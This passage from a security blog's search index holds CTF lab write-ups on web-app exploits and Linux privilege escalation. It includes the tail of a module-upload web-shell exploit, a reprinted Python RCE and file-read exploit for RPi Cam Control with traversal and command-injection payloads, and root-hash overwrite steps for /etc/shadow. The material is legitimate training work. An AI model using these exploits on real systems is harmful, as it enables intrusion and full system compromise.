&lt;filename&gt;/action.admin_statistics.php&lt;/filename&gt;\\n &lt;isdir&gt;0&lt;/isdir&gt;\\n &lt;data&gt;&lt;![CDATA[PD9waHANCmlmICghZnVuY3Rpb25fZXhpc3RzKCJjbXNtcyIpKSByZXR1cm47DQokYXBpdG9rZW4gPSR0aGlzLT5HZXRQcmVmZXJlbmNlKCJhcGl0b2tlbiIpOw0KJHNpdGVpZD0kdGhpcy0+R2V0UHJlZmVyZW5jZSgic2l0ZWlkIik7DQokbGFuZ3VhZ2U9JHRoaXMtPkdldFByZWZlcmVuY2UoImxhbmd1YWdlIiwiZW4iKTsNCg0KJGVtYmVkX2Rhc2hib2FyZCA9ICc8aWZyYW1lIHN0eWxlPSJkaXNwbGF5OmJsb2NrOyIgc3JjPSInIC4gJHRoaXMtPkdldFByZWZlcmVuY2UoImJhc2V1cmwiKQ0KICAuICcvaW5kZXgucGhwP21vZHVsZT1XaWRnZXRpemUmYWN0aW9uPWlmcmFtZSZtb2R1bGVUb1dpZGdldGl6ZT1EYXNoYm9hcmQmYWN0aW9uVG9XaWRnZXRpemU9aW5kZXgmaWRTaXRlPScgLiAkc2l0ZWlkDQogIC4gJyZ0b2tlbl9hdXRoPScgLiAkYXBpdG9rZW4NCiAgLiAnJnBlcmlvZD1tb250aCcNCiAgLiAnJmRhdGU9dG9kYXknDQogIC4gJyZsYW5ndWFnZT0nLiRsYW5ndWFnZQ0KICAuICciIGZyYW1lYm9yZGVyPSIwIiBtYXJnaW5oZWlnaHQ9IjAiIG1hcmdpbndpZHRoPSIwIiB3aWR0aD0iMTAwJSIgaGVpZ2h0PSI4MDBweCcNCiAgLiAnIj48L2lmcmFtZT4nOw0KDQoNCmVjaG8gJGVtYmVkX2Rhc2hib2FyZDsNCg0KDQoNCi8qDQplY2hvICR0aGlzLT5TdGFydFRhYkhlYWRlcnMoKTsNCg0KZWNobyAkdGhpcy0+U2V0VGFiSGVhZGVyKCJiYXNlIiwiU2lkZXIiLCgkdGFiPT0icGFnZXMiKSk7DQplY2hvICR0aGlzLT5TZXRUYWJIZWFkZXIoInNla3Rpb25lciIsIlNla3Rpb25lciIsKCR0YWI9PSJzZWN0aW9ucyIpKTsNCi8vICBlY2hvICR0aGlzLT5TZXRUYWJIZWFkZXIoImluZHN0aWxsaW5nZXIiLCJJbmRzdGlsbGluZ2VyIiwoJHRhYj09InNldHRpbmdzIikpOw0KZWNobyAkdGhpcy0+RW5kVGFiSGVhZGVycygpOw0KDQplY2hvICR0aGlzLT5TdGFydFRhYkNvbnRlbnQoKTsNCmVjaG8gJHRoaXMtPlN0YXJ0VGFiKCJzaWRlciIpOw0KDQplY2hvICR0aGlzLT5FbmRUYWIoKTsNCg0KZWNobyAkdGhpcy0+U3RhcnRUYWIoInNla3Rpb25lciIpOw0KDQplY2hvICR0aGlzLT5FbmRUYWIoKTsNCg0KLyoNCmVjaG8gJHRoaXMtPlN0YXJ0VGFiKCJ1cGxvYWQiKTsNCiAgaW5jbHVkZV9vbmNlKGRpcm5hbWUoX19maWxlX18pLiIvdGFiLmluZHN0aWxsaW5nZXIucGhwIik7DQogIGVjaG8gJHRoaXMtPkVuZFRhYigpOw0KKi8NCi8vZWNobyAkdGhpcy0+RW5kVGFiQ29udGVudCgpOw0KDQoNCg0KLyoNCiRhcGl0b2tlbiA9JHRoaXMtPkdldFByZWZlcmVuY2UoImFwaXRva2VuIik7DQokc2l0ZWlkPSR0aGlzLT5HZXRQcmVmZXJlbmNlKCJzaXRlaWQiKTsNCg0KLy8gd2UgY2FsbCB0aGUgUkVTVCBBUEkgYW5kIHJlcXVlc3QgdGhlIDEwMCBmaXJzdCBrZXl3b3JkcyBmb3IgdGhlIGxhc3QgbW9udGggZm9yIHRoZSBpZHNpdGU9Nw0KJHVybCA9ICR0aGlzLT5HZXRQcmVmZXJlbmNlKCJiYXNldXJsIik7DQokdXJsIC49ICI/bW9kdWxlPUFQSSZtZXRob2Q9UmVmZXJyZXJzLmdldEtleXdvcmRzIjsNCiR1cmwgLj0gIiZpZFNpdGU9JHNpdGVpZCZwZXJpb2Q9bW9udGgmZGF0ZT15ZXN0ZXJkYXkiOw0KJHVybCAuPSAiJmZvcm1hdD1QSFAmZmlsdGVyX2xpbWl0PTIwIjsNCiR1cmwgLj0gIiZ0b2tlbl9hdXRoPSRhcGl0b2tlbiI7DQoNCiRmZXRjaGVkID0gZmlsZV9nZXRfY29udGVudHMoJHVybCk7DQovL2VjaG8gJGZldGNoZWQ7cmV0dXJuOw0KJGNvbnRlbnQgPSB1bnNlcmlhbGl6ZSgkZmV0Y2hlZCk7DQovL3ByaW50X3IoJGNvbnRlbnQpO3JldHVybjsNCg0KLy8gY2FzZSBlcnJvcg0KaWYgKCEkY29udGVudCkgew0KICBwcmludCgiRXJyb3IgcGFyc2luZyBkYXRhLCBjb250ZW50IGZldGNoZWQgPSAiIC4gJGZldGNoZWQpOw0KICByZXR1cm47DQp9DQoNCmlmICgkY29udGVudFsicmVzdWx0Il09PSJlcnJvciIpIHsNCiAgcHJpbnQoIkVycm9yLCBtZXNzYWdlID0gIiAuICRjb250ZW50WyJtZXNzYWdlIl0pOw0KICByZXR1cm47DQp9DQoNCnByaW50KCI8aDE+S2V5d29yZHMgZm9yIHRoZSBsYXN0IG1vbnRoPC9oMT5cbiIpOw0KZm9yZWFjaCAoJGNvbnRlbnQgYXMgJHJvdykgew0KICAka2V5d29yZCA9IGh0bWxzcGVjaWFsY2hhcnMoaHRtbF9lbnRpdHlfZGVjb2RlKHVybGRlY29kZSgkcm93WydsYWJlbCddKSwgRU5UX1FVT1RFUywgJ1VURi04JyksIEVOVF9RVU9URVMsICdVVEYtOCcpOw0KICAkaGl0cyA9ICRyb3dbJ25iX3Zpc2l0cyddOw0KDQogIHByaW50KCI8Yj4ka2V5d29yZDwvYj4gKCRoaXRzIGhpdHMpPGJyPlxuIik7DQp9DQoqLw0K]]&gt;&lt;/data&gt;\\n &lt;/file&gt;\\n &lt;file&gt;\\n &lt;filename&gt;/action.default.php&lt;/filename&gt;\\n &lt;isdir&gt;0&lt;/isdir&gt;\\n &lt;data&gt;&lt;![CDATA[PD9waHANCg0KZWNobyAkdGhpcy0+TmVvUHJvY2Vzc1RlbXBsYXRlRnJvbURhdGEoJHRoaXMtPkdldFRyYWNraW5nQ29kZSgpKTs=]]&gt;&lt;/data&gt;\\n &lt;/file&gt;\\n &lt;file&gt;\\n &lt;filename&gt;/action.savesettings.php&lt;/filename&gt;\\n &lt;isdir&gt;0&lt;/isdir&gt;\\n &lt;data&gt;&lt;![CDATA[PD9waHANCmlmICghZnVuY3Rpb25fZXhpc3RzKCJjbXNtcyIpKSByZXR1cm47DQppZiggISR0aGlzLT5DaGVja1Blcm1pc3Npb24oJ01vZGlmeSBTaXRlIFByZWZlcmVuY2VzJykgKSByZXR1cm47DQoNCg0KJHRoaXMtPk5lb1NhdmVWYWx1ZXMoJHBhcmFtcyxhcnJheSgNCiAgImJhc2V1cmwiLA0KICAidHJhY2tpbmdjb2RlIiwNCiAgImFwaXRva2VuIiwNCiAgInNpdGVpZCINCikpOw0KDQokdGhpcy0+UmVkaXJlY3QoJGlkLCAnYWRtaW5fc2V0dGluZ3MnLCAkcmV0dXJuaWQsYXJyYXkoInRhYiI9PiJzZXR0aW5ncyIsIm1vZHVsZV9tZXNzYWdlIj0+JHRoaXMtPkxhbmcoInNldHRpbmdzc2F2ZWQiKSkpOw0K]]&gt;&lt;/data&gt;\\n &lt;/file&gt;\\n &lt;file&gt;\\n &lt;filename&gt;/lang/&lt;/filename&gt;\\n &lt;isdir&gt;1&lt;/isdir&gt;\\n &lt;/file&gt;\\n &lt;file&gt;\\n &lt;filename&gt;/lang/en_US.php&lt;/filename&gt;\\n &lt;isdir&gt;0&lt;/isdir&gt;\\n &lt;data&gt;&lt;![CDATA[PD9waHANCi8qKg0KICogQ3JlYXRlZCBieSBQaHBTdG9ybS4NCiAqIFVzZXI6IG1vcnRlbg0KICogRGF0ZTogMjctMDktMjAxOA0KICogVGltZTogMDg6NTMNCiAqLw0KDQoNCiRsYW5nWyJ0aXRsZV9zdGF0aXN0aWNzIl09Ik1hdG9tbyBTdGF0aXN0aWNzIjsNCiRsYW5nWyJ0aXRsZV9zZXR0aW5ncyJdPSJNYXRvbW8gU2V0dGluZ3MiOw0KDQokbGFuZ1siYmFzZXVybCJdPSJCYXNlIFVSTCI7DQokbGFuZ1siYmFzZXVybGhlbHAiXT0iVGhlIGJhc2UgdXJsIG9mIHRoZSBNYXRvbW8taW5zdGFsbGF0aW9uLiBQbGVhc2UgaW5jbHVkZSBodHRwOi8vIG9yIGh0dHBzOi8vIjsNCiRsYW5nWyJhcGl0b2tlbiJdPSJBUEkgdG9rZW4iOw0KJGxhbmdbImFwaXRva2VuaGVscCJdPSJUaGUgQVBJIHRva2VuIGZvciBhY2Nlc3NpbmcgTWF0b21vLiBDYW4gYmUgb2J0YWluZWQgYWZ0ZXIgbG9nZ2luZyBpbnRvIHRoZSBNYXRvbW8gaW5zdGFsbGF0aW9uIjsNCiRsYW5nWyJzaXRlaWQiXT0iU2l0ZSBJRCI7DQokbGFuZ1sic2l0ZWlkaGVscCJdPSJUaGUgSUQgb2YgdGhlIHNpdGUgYXMgc2VlbiBieSB0aGUgTWF0b21vIGluc3RhbGxhdGlvbiI7DQokbGFuZ1sidHJhY2tpbmdjb2RlIl09IlRyYWNraW5nIGNvZGUiOw0KJGxhbmdbInRyYWNraW5nY29kZWhlbHAiXT0iVGhlIHRyYWNraW5nIGNvZGUgZnJvbSBNYXRvbW8gKHRoaXMgd2lsbCBwcm9iYWJseSBiZSBhdXRvZ2VuZXJhdGVkIGF0IGEgbGF0ZXIgdmVyc2lvbikiOw0KJGxhbmdbInNhdmVzZXR0aW5ncyJdPSJTYXZlIHNldHRpbmdzIjsNCiRsYW5nWyJzZXR0aW5nc3NhdmVkIl09IlNldHRpbmdzIHNhdmVkIjs=]]&gt;&lt;/data&gt;\\n &lt;/file&gt;\\n &lt;file&gt;\\n &lt;filename&gt;/Matomo.module.php&lt;/filename&gt;\\n &lt;isdir&gt;0&lt;/isdir&gt;\\n &lt;data&gt;&lt;![CDATA[]]&gt;&lt;/data&gt;\\n &lt;/file&gt;\\n &lt;file&gt;\\n &lt;filename&gt;/moduleinfo.ini&lt;/filename&gt;\\n &lt;isdir&gt;0&lt;/isdir&gt;\\n &lt;data&gt;&lt;![CDATA[W21vZHVsZV0KbmFtZSA9ICJNYXRvbW8iCnZlcnNpb24gPSAiMC4wLjEiCmF1dGhvciA9ICJleWVkZWUtbWVkaWEiCmF1dGhvcmVtYWlsID0gIm1vcnRlbkBwb3Vsc2VuLm9yZyIKbWluY21zdmVyc2lvbiA9ICIyLjEuNSIKbGF6eWxvYWRhZG1pbiA9IDAKbGF6eWxvYWRmcm9udGVuZCA9IDAK]]&gt;&lt;/data&gt;\\n &lt;/file&gt;\\n &lt;file&gt;\\n &lt;filename&gt;/templates/&lt;/filename&gt;\\n &lt;isdir&gt;1&lt;/isdir&gt;\\n &lt;/file&gt;\\n &lt;file&gt;\\n &lt;filename&gt;/templates/adminsettings.tpl&lt;/filename&gt;\\n &lt;isdir&gt;0&lt;/isdir&gt;\\n &lt;data&gt;&lt;![CDATA[e2Zvcm1fc3RhcnQgYWN0aW9uPSJzYXZlc2V0dGluZ3MifQ0KPGRpdiBjbGFzcz0icGFnZW92ZXJmbG93Ij4NCiAgICA8cCBjbGFzcz0icGFnZXRleHQiPg0KICAgICAgICA8bGFiZWwgZm9yPSJ7JGFpZH1mbGQxIj57JG1vZC0+bGFuZygiYmFzZXVybCIpfTo8L2xhYmVsPiB7KmNtc19oZWxwIGtleT0naGVscF9hcnRpY2xlX3VzZWV4cGlyeScgdGl0bGU9JHVzZWV4cGlyYXRpb250ZXh0Kn0NCiAgICA8L3A+DQogICAgPHAgY2xhc3M9InBhZ2VpbnB1dCI+DQogICAgICAgIDxpbnB1dCBpZD0ieyRhaWR9ZmxkMSIgdHlwZT0idGV4dCIgc2l6ZT0iNjQiIGxlbmd0aD0iNjQiIHZhbHVlPSJ7JG1vZC0+cHJmKCJiYXNldXJsIil9IiBuYW1lPSJ7JGFpZH1iYXNldXJsIj57JG1vZC0+bGFuZygiYmFzZXVybGhlbHAiKX0NCiAgICA8L3A+DQo8L2Rpdj4NCg0KPGRpdiBjbGFzcz0icGFnZW92ZXJmbG93Ij4NCiAgICA8cCBjbGFzcz0icGFnZXRleHQiPg0KICAgICAgICA8bGFiZWwgZm9yPSJ7JGFpZH1mbGQzIj57JG1vZC0+bGFuZygiYXBpdG9rZW4iKX06PC9sYWJlbD4geypjbXNfaGVscCBrZXk9J2hlbHBfYXJ0aWNsZV91c2VleHBpcnknIHRpdGxlPSR1c2VleHBpcmF0aW9udGV4dCp9DQogICAgPC9wPg0KICAgIDxwIGNsYXNzPSJwYWdlaW5wdXQiPg0KICAgICAgICA8aW5wdXQgaWQ9InskYWlkfWZsZDMiIHR5cGU9InRleHQiIHNpemU9IjY0IiBsZW5ndGg9IjY0IiB2YWx1ZT0ieyRtb2QtPnByZigiYXBpdG9rZW4iKX0iIG5hbWU9InskYWlkfWFwaXRva2VuIj57JG1vZC0+bGFuZygiYXBpdG9rZW5oZWxwIil9DQogICAgPC9wPg0KPC9kaXY+DQoNCjxkaXYgY2xhc3M9InBhZ2VvdmVyZmxvdyI+DQogICAgPHAgY2xhc3M9InBhZ2V0ZXh0Ij4NCiAgICAgICAgPGxhYmVsIGZvcj0ieyRhaWR9ZmxkNCI+eyRtb2QtPmxhbmcoInNpdGVpZCIpfTo8L2xhYmVsPiB7KmNtc19oZWxwIGtleT0naGVscF9hcnRpY2xlX3VzZWV4cGlyeScgdGl0bGU9JHVzZWV4cGlyYXRpb250ZXh0Kn0NCiAgICA8L3A+DQogICAgPHAgY2xhc3M9InBhZ2VpbnB1dCI+DQogICAgICAgIDxpbnB1dCBpZD0ieyRhaWR9ZmxkNCIgdHlwZT0idGV4dCIgc2l6ZT0iOCIgbGVuZ3RoPSI4IiB2YWx1ZT0ieyRtb2QtPnByZigic2l0ZWlkIil9IiBuYW1lPSJ7JGFpZH1zaXRlaWQiPnskbW9kLT5sYW5nKCJzaXRlaWRoZWxwIil9DQogICAgPC9wPg0KPC9kaXY+DQoNCjxkaXYgY2xhc3M9InBhZ2VvdmVyZmxvdyI+DQogICAgPHAgY2xhc3M9InBhZ2V0ZXh0Ij4NCiAgICAgICAgPGxhYmVsIGZvcj0ieyRhaWR9ZmxkMiI+eyRtb2QtPmxhbmcoInRyYWNraW5nY29kZSIpfTo8L2xhYmVsPiB7KmNtc19oZWxwIGtleT0naGVscF9hcnRpY2xlX3VzZWV4cGlyeScgdGl0bGU9JHVzZWV4cGlyYXRpb250ZXh0Kn0NCiAgICA8L3A+DQogICAgPHAgY2xhc3M9InBhZ2VpbnB1dCI+DQogICAgICAgIDx0ZXh0YXJlYSBpZD0ieyRhaWR9ZmxkMiIgcm93cz0iMTIiIGNvbHM9IjQwIiBuYW1lPSJ7JGFpZH10cmFja2luZ2NvZGUiPnskbW9kLT5wcmYoInRyYWNraW5nY29kZSIpfTwvdGV4dGFyZWE+DQogICAgICAgIDxici8+DQogICAgICAgIHskbW9kLT5sYW5nKCJ0cmFja2luZ2NvZGVoZWxwIil9DQogICAgPC9wPg0KPC9kaXY+DQoNCjxkaXYgY2xhc3M9InBhZ2VvdmVyZmxvdyI+DQogICAgPHAgY2xhc3M9InBhZ2V0ZXh0Ij4NCg0KICAgIDwvcD4NCiAgICA8cCBjbGFzcz0icGFnZWlucHV0Ij4NCiAgICAgICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0ieyRhaWR9c3VibWl0IiB2YWx1ZT0ieyRtb2QtPmxhbmcoInNhdmVzZXR0aW5ncyIpfSIvPg0KICAgIDwvcD4NCjwvZGl2Pg0KDQoNCntmb3JtX2VuZH0NCg==]]&gt;&lt;/data&gt;\\n &lt;/file&gt;\\n&lt;/module&gt;\\r\\n-----------------------------207726338310671742711263591267--\\r\\n\"requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)print \"Try to access your shell at: \" + target_url + \"/modules/Matomo/action.admin_settings.php?cmd=ls%20-al\"" }, { "title": "AttackDefense.com [SXSS] - Concrete5 CMS", "url": "/nitesculucian.github.io/2018/11/03/attackdefense-com-sxss-concrete5-cms/", "categories": "AttackDefense.com, writeups", "tags": "writeups, CTF, challange, AttackDefense.com", "date": "2018-11-03 02:53:00 +0200", "snippet": "MissionIn this exercise, the attacker has admin access already so there is nothing more to be done. However, looks like the admin access does lead to an XSS attack. So you can try to find this XSS ...", "content": "MissionIn this exercise, the attacker has admin access already so there is nothing more to be done. However, looks like the admin access does lead to an XSS attack. So you can try to find this XSS as purely academic exercise.A version of Concrete5 CMS is vulnerable to a stored cross site scripting attack. The following username and passwords may be used to explore the application and/or find a vulnerability which might require authenticated access: Username: admin Password: 123321Objective: Your task is to find and exploit this vulnerability.Level difficulty: EasyCategory: Real World Webapps &gt; Stored XSSSolutionThis time, I was provided with a full Concrete5 CMS website with multiple pages.On the following page, I found the admin panel login and, I got access using the provided username and password. http://x9prkx7tb2hteo96do4zamsv0.public1.attackdefenselabs.com/index.php/login/By navigating the application control panel, I have managed to obtain access to the environment variables on the following link. http://x9prkx7tb2hteo96do4zamsv0.public1.attackdefenselabs.com/index.php/dashboard/system/environment/info/As we can see, the concrete5 Version is 5.6.1.2.Again I will use @GetSploitBot for Telegram in order to obtain exploits for my version of concret5. https://vulners.com/seebug/SSV:79724Following the above exploit, I was able to found the following path: http://x9prkx7tb2hteo96do4zamsv0.public1.attackdefenselabs.com/index.php/dashboard/system/attributes/sets/I decided to set my XSS payloads at http://x9prkx7tb2hteo96do4zamsv0.public1.attackdefenselabs.com/index.php/dashboard/system/attributes/sets/category/1/, as seen in the below example:Result of my payloads:" }, { "title": "AttackDefense.com [SXSS] - YetiForce CRM", "url": "/nitesculucian.github.io/2018/11/02/attackdefense-com-sxss-yetiforce-crm/", "categories": "AttackDefense.com, writeups", "tags": "writeups, CTF, challange, AttackDefense.com", "date": "2018-11-02 00:53:00 +0200", "snippet": "MissionIn this exercise, the attacker has admin access already so there is nothing more to be done. However, looks like the admin access does lead to an XSS attack. So you can try to find this XSS ...", "content": "MissionIn this exercise, the attacker has admin access already so there is nothing more to be done. However, looks like the admin access does lead to an XSS attack. So you can try to find this XSS as purely academic exercise.A version of YetiForce CRM is vulnerable to stored cross side scripting attack. The following username and passwords may be used to explore the application and/or find a vulnerability which might require authenticated access: Username: admin Password: Password1Objective: Your task is to find and exploit this vulnerability.Level difficulty: EasyCategory: Real World Webapps &gt; Stored XSSSolutionAt first, I was prompted straight to the application login and by using the above-provided username and password. I was able to gain access to the application backend.Straight after login, we can see that in the footer section of the application the version is listed as 3.0.0.Not knowing from where to start, I decided to use @GetSploitBot for Telegram in order to obtain exploits for the provided information “A version of YetiForce CRM is vulnerable to stored cross side scripting attack.”. https://vulners.com/zdt/1337DAY-ID-25124Accessing the following link we can observe the exploit described path and input field. http://50ucbc62if096e5a0gyy0icih.public1.attackdefenselabs.com/index.php?module=Accounts&amp;view=Detail&amp;record=110I set my payload as such in the comments input:Proof of Stored XSS:" }, { "title": "AttackDefense.com [PE] - Exploiting Setuid Programs II", "url": "/nitesculucian.github.io/2018/11/01/attackdefense-com-pe-exploiting-setuid-programs-ii/", "categories": "AttackDefense.com, ctf, writeups, PrivilegeEscalation", "tags": "writeups, CTF, challange, AttackDefense.com", "date": "2018-11-01 03:10:00 +0200", "snippet": "As you’ve seen in another challenge in this category, setuid programs can provide great power and flexibility, but if not secured properly, can easily lead to a full system compromise.Your mission ...", "content": "As you’ve seen in another challenge in this category, setuid programs can provide great power and flexibility, but if not secured properly, can easily lead to a full system compromise.Your mission is to get a root shell on the box!Level difficulty: EasyCategory: Privilege Escalation &gt; LinuxSolutionOn this challenge, I got the web interface of a Linux terminal and I was authenticated as an unprivileged user named student.Because my task is about “Exploiting Setuid Programs” of course I started searching for getuid and setuid programs.And one pops straight to my face as a permission misconfiguration:Abusing vim.tiny setuid permission to edit restricted file:Now that we know the setuid attacks works create a password hash.student@attackdefense:~$ openssl passwd -1 -salt root pass123$1$root$quimBCDAqK3JX3mbeqrrD1student@attackdefense:~$Proceed with editing the /etc/shadow/ file and replace the root password hash with the newly generated one.Authenticate to the root user account:" }, { "title": "AttackDefense.com [PE] - Editing Gone Wrong", "url": "/nitesculucian.github.io/2018/11/01/attackdefense-com-pe-editing-gone-wrong/", "categories": "AttackDefense.com, ctf, writeups, PrivilegeEscalation", "tags": "writeups, CTF, challange, AttackDefense.com", "date": "2018-11-01 01:11:00 +0200", "snippet": "MissionYou have managed to get access to the “student” account on the client’s server. This is bad enough as all the student resources are available to you. You are now trying to escalate privilege...", "content": "MissionYou have managed to get access to the “student” account on the client’s server. This is bad enough as all the student resources are available to you. You are now trying to escalate privileges to get root. After some digging around and from other sources, you figure out that the same person in the organization uses both the student account and the root account on the system.Your mission is to escalate privileges and get a root shell on the box!Level difficulty: EasyCategory: Privilege Escalation &gt; LinuxSolutionOn this challenge, I got the web interface of a Linux terminal and I was authenticated as an unprivileged user named student.After that, I started to fingerprint the system and find something that I can use in a privilege escalation attack.At some point, I found my starting point for my privilege escalation attack. As you can see in the next image, my student user is allowed to run man command as sudo.Running man with sudo:Unfortunately (or lucky for us) man knows how to spawn shells using the !sh command:Proof of solving the challenge:" }, { "title": "AttackDefense.com [PE] - Permissions Matter!", "url": "/nitesculucian.github.io/2018/11/01/attackdefense-com-pe-permissions-matter/", "categories": "AttackDefense.com, ctf, writeups, PrivilegeEscalation", "tags": "writeups, CTF, challange, AttackDefense.com", "date": "2018-11-01 00:16:00 +0200", "snippet": "MissionThe admin was tasked to create a replica of an existing Linux system. He copied the entire filesystem to his computer, made modifications to some files and then copied it onto the newly prov...", "content": "MissionThe admin was tasked to create a replica of an existing Linux system. He copied the entire filesystem to his computer, made modifications to some files and then copied it onto the newly provisioned system. Unfortunately, in his haste to set the new system up, he forgot to take care of permission sets.Your mission is to get a root shell on the box!Level difficulty: EasyCategory: Privilege Escalation &gt; LinuxSolutionOn this challenge, I got the web interface of a Linux terminal and I was authenticated as an unprivileged user named student.First of all, I checked If I had access to both passwd and shadow files.Funny enough I had access to the shadow file but I see no password hash within that.I decided to check if I had write access to the shadow or passwd file in order to place a password hash for the root user (some legacy systems accept password hashes in passwd).As you can see in the above image, I have both read and write permissions for the shadow file. Generating the password hash as such:student@attackdefense:~$ openssl passwd -1 -salt root pass123$1$root$quimBCDAqK3JX3mbeqrrD1student@attackdefense:~$Placing the password hash for root user in the shadow file:Authenticating as root on the target server:" }, { "title": "AttackDefense.com [RCE] - RPi Cam Control", "url": "/nitesculucian.github.io/2018/10/28/attackdefense-com-rce-rpi-cam-control/", "categories": "AttackDefense.com, ctf, writeups, RCE", "tags": "writeups, CTF, challange, AttackDefense.com", "date": "2018-10-28 23:27:00 +0200", "snippet": "MissionThe attacker might not have any user level access to the web application. However, this does not mean that the application cannot be compromised remotely. Remote Code Execution vulnerabiliti...", "content": "MissionThe attacker might not have any user level access to the web application. However, this does not mean that the application cannot be compromised remotely. Remote Code Execution vulnerabilities could be triggered even by unauthenticated users.In the exercise below, the attacker is unauthenticated to the web application and needs to find a remote code injection attack to run arbitrary commands on the server.A version of RPi Cam Control is vulnerable to a remote code execution attack.Objective: Your task is to find and exploit this vulnerability.Level difficulty: EasyCategory: Real World Webapps &gt; Remote Code ExecutionSolutionOn this challenge, I received unauthenticated access to a camera control interface presenting multiple actions buttons.I decided to use @GetSploitBot for Telegram in order to obtain exploits for the application version RPi Cam Control v6.3.14. I got the exploit code from https://vulners.com/zdt/1337DAY-ID-28478###### Exploit Title: RPi Cam Control &lt;= v6.3.14 (RCE) Multiple Vulnerabilities - preview.php# Date: 16/08/2017# Exploit Author: Alexander Korznikov# Vendor Homepage: https://github.com/silvanmelchior/RPi_Cam_Web_Interface# Software Link: https://github.com/silvanmelchior/RPi_Cam_Web_Interface# Version: &lt;= v6.3.14# Date 16/08/2017## A web interface for the RPi Cam# Vendor github: https://github.com/silvanmelchior/RPi_Cam_Web_Interface## Bug Discovered by Alexander Korznikov:# www.exploit-db.com/author/?a=8722# www.linkedin.com/in/nopernik# www.korznikov.com## RPi Cam Control &lt;= v6.3.14 is vulnerable to Local File Read and Blind Command Injection.### Local File Read (get /etc/passwd file):# ----------------# POST /preview.php HTTP/1.1# Host: 127.0.0.1# Content-Type: application/x-www-form-urlencoded# Connection: close# Content-Length: 80## download1=../../../../../../../../../../../../../../../../etc/passwd.v0000.t### Blind Command Injection:# ------------------# POST /preview.php HTTP/1.1# Host: 127.0.0.1# Content-Type: application/x-www-form-urlencoded# Connection: close# Content-Length: 52## convert=none&amp;convertCmd=$(COMMAND_TO_EXECUTE)### Blind Command Injection can be used with Local File Read to properly get the output of injected command.## Proof of Concept Code:##### #!/usr/bin/python import requestsimport sysif not len(sys.argv[2:]): print \"Usage: RPi-Cam-Control-RCE.py 127.0.0.1 'cat /etc/passwd'\" exit(1) def GET(target, rfile): res = requests.post(\"http://%s/preview.php\" % target, headers={\"Content-Type\": \"application/x-www-form-urlencoded\", \"Connection\": \"close\"}, data={\"download1\": \"../../../../../../../../../../../../../../../../{}.v0000.t\".format(rfile)}) return res.content def RCE(target, command): requests.post(\"http://%s/preview.php\" % target, headers={\"Content-Type\": \"application/x-www-form-urlencoded\", \"Connection\": \"close\"}, data={\"convert\": \"none\", \"convertCmd\": \"$(%s &gt; /tmp/output.txt)\" % command}) return GET(target,'/tmp/output.txt') target = sys.argv[1]command = sys.argv[2] print RCE(target,command)# 0day.today [2018-01-01] #Exploit usage example:" }, { "title": "AttackDefense.com [RCE] - PHP Utility Belt", "url": "/nitesculucian.github.io/2018/10/28/attackdefense-com-rce-php-utility-belt/", "categories": "AttackDefense.com, ctf, writeups, RCE", "tags": "writeups, CTF, challange, AttackDefense.com", "date": "2018-10-28 22:48:00 +0200", "snippet": "MissionThe attacker might not have any user level access to the web application. However, this does not mean that the application cannot be compromised remotely. Remote Code Execution vulnerabiliti...", "content": "MissionThe attacker might not have any user level access to the web application. However, this does not mean that the application cannot be compromised remotely. Remote Code Execution vulnerabilities could be triggered even by unauthenticated users.In the exercise below, the attacker is unauthenticated to the web application and needs to find a remote code injection attack to run arbitrary commands on the server.A version of PHP Utility Belt is vulnerable to a remote code execution attack.Objective: Your task is to find and exploit this vulnerability.Level difficulty: EasyCategory: Real World Webapps &gt; Remote Code ExecutionSolutionFirst of all, I must admit that I am doing this challenge a few hours after its initial release because I enjoyed this category.On this challenge, I was presented with an interesting and dumb enough application that will execute my code on the first try.All I did is this….The application already executes my code… So… More examples I suppose:Content of /etc/passwd:Unfortunately, my target application server dines access to an external resource and therefore I will not struggle to get a reverse shell." }, { "title": "AttackDefense.com [SXSS] - MyBB Downloads Plugin", "url": "/nitesculucian.github.io/2018/10/28/attackdefense-com-sxss-mybb-downloads-plugin/", "categories": "AttackDefense.com, writeups", "tags": "writeups, CTF, challange, AttackDefense.com", "date": "2018-10-28 17:29:00 +0200", "snippet": "MissionA version of MyBB Downloads Plugin is vulnerable to a stored cross site scripting attack.Your task is to find and exploit this vulnerability.The following username and password may be used t...", "content": "MissionA version of MyBB Downloads Plugin is vulnerable to a stored cross site scripting attack.Your task is to find and exploit this vulnerability.The following username and password may be used to explore the application and create regular users if required to exploit authenticated access vulnerabilities: User: test2 Password: passwordLevel difficulty: EasyCategory: Real World Webapps &gt; Stored XSSSolutionOn this challenge, I received a real MyBB forum application deployment and potentially at the last available version.I used the above-provided credentials to authenticate on the forum application:At this point, we discover that the provided credentials are for an unprivileged user (forum member).Not knowing from where to start, I decided to use @GetSploitBot for Telegram in order to obtain exploits for the provided information “A version of MyBB Downloads Plugin is vulnerable”. https://vulners.com/packetstorm/PACKETSTORM:147061By going to http://3fthpltqv67g8lfuh2hgo4ztl.public2.attackdefenselabs.com/downloads.php I discovered the following Minion.By accessing that specific Minion (http://3fthpltqv67g8lfuh2hgo4ztl.public2.attackdefenselabs.com/downloads.php?category=1), I discovered the place where I should proceed with the exploit steps.By clicking on “New Download”, I was redirected to http://3fthpltqv67g8lfuh2hgo4ztl.public2.attackdefenselabs.com/downloads.php?newdownload=1.I introduced multiple payloads in order to test for other XSS vulnerabilities then described on the reported exploit.Funny enough I was unable to exploit my XSS due to the fact that I created an unintended SQL Injection exploit (OPS… my bad!). Also at the moment of this article, the identified SQL Injection vulnerability has no public available exploit (yet another Zero-day?).I changed my XSS payloads as such:And I obtained my XSS payload that can be traced back to my payload input:" }, { "title": "AttackDefense.com [SXSS] - ApPHP MicroBlog", "url": "/nitesculucian.github.io/2018/10/28/attackdefense-com-sxss-apphp-microblog/", "categories": "AttackDefense.com, writeups", "tags": "writeups, CTF, challange, AttackDefense.com", "date": "2018-10-28 03:31:00 +0300", "snippet": "MissionA version of ApPHP MicroBlog is vulnerable to stored cross site scripting attack. Your task is to find and exploit this vulnerability. Authenticated access is not required to exploit this vu...", "content": "MissionA version of ApPHP MicroBlog is vulnerable to stored cross site scripting attack. Your task is to find and exploit this vulnerability. Authenticated access is not required to exploit this vulnerability.Level difficulty: EasyCategory: Real World Webapps &gt; Stored XSSSolutionOn this challenge, I was again provided with the same version of ApPHP MicroBlog as on the RCE exercise found here.Therefore, I tried the same password and username (admin &amp;&amp; password) as in the RCE challenge on the admin login form. http://udxkg51hwj61dpkifm62lkdu9.public2.attackdefenselabs.com/index.php?admin=login http://udxkg51hwj61dpkifm62lkdu9.public2.attackdefenselabs.com/index.phpBy going to an already posted article, we can observe the presence of a comment module within our blog. In that comment module, I used 